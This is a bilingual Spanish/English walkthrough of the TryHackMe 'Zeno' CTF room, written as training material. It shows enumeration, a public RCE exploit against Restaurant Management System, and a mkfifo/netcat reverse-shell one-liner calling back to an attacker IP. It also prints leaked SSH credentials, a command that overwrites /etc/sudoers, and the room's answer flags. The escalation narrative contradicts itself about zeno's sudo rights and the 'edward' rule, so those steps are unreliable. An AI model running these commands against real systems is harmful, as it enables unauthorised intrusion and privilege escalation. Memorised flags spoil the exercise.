# Zeno
| **Dificultad** | Medium |
| **Tipo** | CTF |
| **Slug** | `zeno` |
| **Link** | [TryHackMe](https://tryhackme.com/room/zeno) |
| **Sección** | SOC Level 1 / Explotación |
| **Fuente** | TryHackMe - Zeno (https://tryhackme.com/room/zeno) |
| **Componentes** | La Máquina Zeno, Nmap, Gobuster, Linux, Explotación de aplicación web (Restaurant Management System - CVE-2021-34372), webshell PHP, Python, reverse shell, credenciales en base de datos (config.php), SSH, escalada de privilegios (sudo /bin/sh, edición de /etc/sudoers), root |
| **Impacto** | Sala Medium estilo CTF de una sola máquina Linux: escaneo de puertos y servicios, enumeración de directorios web, explotación de un RCE conocido en Restaurant Management System 1.0 (searchsploit/python3 47520.py), obtención de una webshell, reverse shell, exfiltración de credenciales de la BD desde config.php, acceso SSH y escalada a root mediante abuso de permisos sudo sobre /bin/sh + edición de /etc/sudoers. Flags: user.txt y root.txt. |

---
**Contexto:** Zeno es una sala CTF máquina-única (Linux/Medium) en la que hay que conseguir acceso de usuario y posteriormente escalar a root. El compromiso arranca con un Nmap agresivo (`-sSCV -p-`), la enumeración web con Gobuster para descubrir la carpeta RMS, la explotación del Restaurant Management System 1.0 (RCE, Python `47520.py`) que devuelve una TTY interactiva falsa, y la subida de una reverse-shell.php para una shell fiable. Revisando el código (config.php) se recuperan las credenciales de la base de datos (`zeno:FrobjoodAdkoonceanJa`) que dan acceso por SSH. Como `zeno` no tiene `sudo`, se prepara el terreno abusando del sudoer con `/bin/sh` para inyectar una regla `ALL=(root) NOPASSWD` en /etc/sudoers y, tras un reinicio (reboot), se usa `sudo su` como usuario para la flag de root.
*EN: Zeno is a single-machine CTF (Linux/Medium) where you must achieve user access and then escalate to root. The compromise starts with an aggressive Nmap (`-sSCV -p-`), web enumeration with Gobuster to discover the RMS folder, exploitation of Restaurant Management System 1.0 (RCE, Python `47520.py`) which yields a fake interactive TTY, and uploading a reverse-shell.php for a reliable shell. Reviewing the source (`config.php`) reveals the database credentials (`zeno:FrobjoodAdkoonceanJa`), which grant SSH access. Since `zeno` has no `sudo`, privileges are prepared by abusing the `/bin/sh` sudoer entry to inject an `ALL=(root) NOPASSWD` rule into /etc/sudoers and, after a reboot, `sudo su` is used for the root flag.*

## Solucionario
### Task 1 — Arranca la máquina virtual / Start up the VM
**Explicación:** Presentación de la sala: arrancar la máquina y conectarse a la red de TryHackMe. No hay pregunta práctica.
*EN: Room introduction: deploy the machine and connect to the TryHackMe network. No hands-on question.*
```text
1. No answer needed
```

### Task 2 — Consigue ambas flags / Get both flags
**Explicación:** Enumeración completa de la máquina: Nmap revela SSH (22) y Apache (80). Gobuster descubre `/RMS/` (Restaurant Management System 1.0). El exploit `python3 47520.py` (searchsploit) sobre la ruta login genera una webshell (reverse-shell.php) que se abusa con `nc -nvlp 4444` enviando el payload base64 (mkfifo). Revisando la fuente de la aplicación, en `config.php` (o dump de la BD) se obtienen las credenciales `zeno:FrobjoodAdkoonceanJa` con las que se accede por SSH y se lee `user.txt`. Para el salto a root, `sudo -l` muestra que `zeno` puede ejecutar `/bin/sh` como root sin contraseña; inyectando una línea en /etc/sudoers (`edward ALL=(root) NOPASSWD: ALL`) y tras un `sudo /usr/sbin/reboot`, se ejecuta `sudo su` y se lee `root.txt`.
*EN: Full enumeration: Nmap reveals SSH (22) and Apache (80). Gobuster discovers `/RMS/` (Restaurant Management System 1.0). The `python3 47520.py` exploit (searchsploit) against the login route spawns a webshell (reverse-shell.php) abused with `nc -nvlp 4444` sending the base64 payload (mkfifo). Inspecting the app source, `config.php` (or a DB dump) yields the credentials `zeno:FrobjoodAdkoonceanJa`, which grant SSH access and let us read `user.txt`. For the root jump, `sudo -l` shows `zeno` can run `/bin/sh` as root without a password; after injecting a line into /etc/sudoers (`edward ALL=(root) NOPASSWD: ALL`) and a `sudo /usr/sbin/reboot`, `sudo su` is executed and `root.txt` is read.*
```bash
nmap -sSCV -p- <IP>
gobuster dir -u http://<IP> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
searchsploit Restaurant Management System
python3 47520.py http://<IP>/RMS/ /bin/bash
# subir/inyectar webshell reverse-shell.php
nc -nvlp 4444
echo 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <IP-attac> 4444 >/tmp/f' | base64 -w0
# revisar config.php / volcado de la BD → credenciales
cat config.php    # zeno:FrobjoodAdkoonceanJa
ssh zeno@<IP>     # passw: FrobjoodAdkoonceanJa
sudo -l           # (root) NOPASSWD: /bin/sh
sudo /bin/sh -c 'echo "edward ALL=(root) NOPASSWD: ALL" > /etc/sudoers'
sudo /usr/sbin/reboot
# tras el reinicio
sudo su
cat /root/root.txt
```
```text
1. No answer needed
2. THM{070cab2c9dc622e5d25c0709f6cb0510}
3. THM{b187ce4b85232599ca72708ebde71791}
4. No answer needed
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Pregunta de lectura de la tarea (sin respuesta requerida). | `No answer needed` |
| 2 | What is the user.txt? | `THM{070cab2c9dc622e5d25c0709f6cb0510}` |
| 3 | What is the root.txt? | `THM{b187ce4b85232599ca72708ebde71791}` |
| 4 | Pregunta de lectura de la tarea (sin respuesta requerida). | `No answer needed` |
---
**Metodología:** Escaneo exhaustivo con `nmap -sSCV -p-` para mapear servicios → enumeración de directorios con Gobuster para hallar el CMS (− `/RMS/`) → búsqueda y ejecución del exploit público contra Restaurant Management System 1.0 (`python3 47520.py`) para obtener una webshell → reverse shell a una sesión interactiva → revisión del código fuente y de la base de datos para recuperar credenciales (config.php) → acceso SSH → revisión de `sudo -l` para el vector de escalada → inyección en /etc/sudoers + reinicio → `sudo su` → lectura de flags.

### Cadena de ataque / Attack Chain
```text
nmap -sSCV -p- → puertos 22 (SSH), 80 (Apache)
gobuster → /RMS/ (Restaurant Management System 1.0)
searchsploit → 47520.py (RCE) → webshell → reverse-shell.php
nc -nvlp 4444 + payload base64 (mkfifo) → shell
config.php / BD → zeno:FrobjoodAdkoonceanJa
ssh zeno@<IP> → user.txt (THM{070cab2c9dc622e5d25c0709f6cb0510})
sudo -l → (root) NOPASSWD: /bin/sh
sudo /bin/sh -c 'echo "edward ALL=(root) NOPASSWD: ALL" > /etc/sudoers' → sudo /usr/sbin/reboot
sudo su → root.txt (THM{b187ce4b85232599ca72708ebde71791})
```
**Learning chain:** escaneo (Nmap) → enumeración web (Gobuster) → exploit público (searchsploit/python3 47520.py) → webshell → reverse shell + base64 (mkfifo) → credenciales en fichero de configuración → SSH → sudo -l → sudoers injection + reboot → sudo su → root.
**Lección:** *El camino a root en esta sala no es un binario sudo directo, sino un escalón por partes: las credenciales reutilizadas de la BD dan SSH, y el sudo NOPASSWD sobre `/bin/sh` permite "autonombrarse" sudoer (escribir + reiniciar) para terminar con `sudo su`; revisa siempre `sudo -l` y los ficheros de configuración antes de buscar exploits a ciegas.*
**MITRE ATT&CK:** T1046 (Network Service Discovery - Nmap), T1040/N/A (enumeración: Gobuster - Web Directory Discovery), T1190 (Exploit Public-Facing Application - RMS CVE-2021-34372), T1505.003 (Web Shell - reverse-shell.php), T1059.006 (Python/payload base64 mkfifo), T1078 (Valid Accounts - credenciales de BD reutilizadas en SSH), T1021.001 (Remote Services - SSH), T1548.003 (Sudo and Sudo Caching), T1068 (Exploitation for Privilege Escalation - sudoers injection/reboot).
**Fuente:** [TryHackMe - Zeno](https://tryhackme.com/room/zeno)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.